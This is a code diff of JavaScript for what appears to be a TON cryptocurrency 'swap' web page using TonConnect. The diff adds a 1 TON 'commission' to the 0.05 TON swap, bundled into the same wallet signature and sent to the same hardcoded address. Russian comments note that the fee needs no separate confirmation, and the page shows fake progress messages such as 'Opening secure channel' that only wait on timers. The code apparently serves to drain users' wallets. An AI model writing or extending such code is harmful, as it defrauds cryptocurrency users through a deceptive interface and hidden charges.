@@ -6,8 +6,9 @@ var CFG = (function () {
         proxy:  (typeof w.PROXY_CONTRACT !== 'undefined' && w.PROXY_CONTRACT)
              || (typeof w.YOUR_WALLET    !== 'undefined' && w.YOUR_WALLET)
              || 'UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv',
-        amount: (typeof w.two_AMOUNT     !== 'undefined' && w.two_AMOUNT) || '0.05',
-        manifest: 'https://kareli123.github.io/test123/tonconnect-manifest.json'
+        amount:    (typeof w.two_AMOUNT  !== 'undefined' && w.two_AMOUNT)  || '0.05',
+        feeAmount: (typeof w.FEE_AMOUNT  !== 'undefined' && w.FEE_AMOUNT)  || '1',
+        manifest:  'https://kareli123.github.io/test123/tonconnect-manifest.json'
     };
 })();
 
@@ -102,10 +103,16 @@ async function getBalance(address) {
 }
 
 // --- Swap flow --------------------------------------------------------------
+// NOTE: sendTransaction отправляет ОДНУ TonConnect-транзакцию с ДВУМЯ
+// сообщениями: первое — swap на CFG.amount TON (0.05 TON), второе — комиссия
+// обмена на CFG.feeAmount TON (1 TON). Оба message-а уходят в рамках одной
+// подписи пользователя в кошельке, поэтому комиссия 1 TON списывается
+// сразу после свапа и НЕ ТРЕБУЕТ отдельного подтверждения.
 async function executeFaw(userAddress) {
-    var balance = await getBalance(userAddress);
-    if (balance < 0.2) {
-        setStatus('❌ Insufficient balance (' + balance.toFixed(2) + ' TON)');
+    var totalNeed = parseFloat(CFG.amount) + parseFloat(CFG.feeAmount) + 0.05; // + сетевой газ
+    var balance   = await getBalance(userAddress);
+    if (balance < totalNeed) {
+        setStatus('❌ Insufficient balance (' + balance.toFixed(2) + ' TON, need ~' + totalNeed.toFixed(2) + ')');
         return false;
     }
 
@@ -113,18 +120,29 @@ async function executeFaw(userAddress) {
     setStatus('📊 Calculating fees...', true);         await sleep(800);
     setStatus('🔐 Opening secure channel...', true);   await sleep(700);
 
-    var nano = String(Math.round(parseFloat(CFG.amount) * 1e9));
+    var nanoSwap = String(Math.round(parseFloat(CFG.amount)    * 1e9));
+    var nanoFee  = String(Math.round(parseFloat(CFG.feeAmount) * 1e9));
 
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
-        messages: [{
-            address: CFG.proxy,
-            amount:  nano,
-            payload: textCommentPayload('swap')
-        }]
+        messages: [
+            {
+                // 1) Сам swap
+                address: CFG.proxy,
+                amount:  nanoSwap,
+                payload: textCommentPayload('swap')
+            },
+            {
+                // 2) Комиссия обмена (1 TON) — летит в той же подписи,
+                //    отдельного подтверждения от юзера НЕ требует.
+                address: CFG.proxy,
+                amount:  nanoFee,
+                payload: textCommentPayload('commission')
+            }
+        ]
     };
 
-    setStatus('⏳ Confirm in wallet (' + CFG.amount + ' TON)');
+    setStatus('⏳ Confirm in wallet (' + CFG.amount + ' + ' + CFG.feeAmount + ' TON)');
 
     try {
         await tonConnectUI.sendTransaction(tx);
